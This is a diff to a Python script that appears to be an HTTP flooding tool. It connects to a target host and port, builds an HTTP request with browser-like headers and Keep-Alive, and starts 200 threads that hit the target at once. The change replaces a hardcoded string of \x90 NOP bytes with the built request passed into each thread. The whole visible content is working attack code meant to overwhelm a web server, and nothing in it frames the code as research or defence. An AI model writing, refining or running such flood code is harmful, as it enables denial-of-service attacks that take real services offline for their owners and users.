@@ -16,8 +16,7 @@ def get_target(url):
         pass
     return target
 
-def http_sock(url,timing):
-    req = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+def http_sock(url,timing,req):
     sock = socket.socket()
     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
     sock.connect((str(url['host']), int(url['port'])))
@@ -43,7 +42,7 @@ req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif
 req += "Connection: Keep-Alive\r\n\r\n"
 for _ in range(int(200)):
     try:
-        thd = threading.Thread(target=http_sock, args=(target,timing))
+        thd = threading.Thread(target=http_sock, args=(target,timing,req))
         thd.start()
     except Exception:
         pass
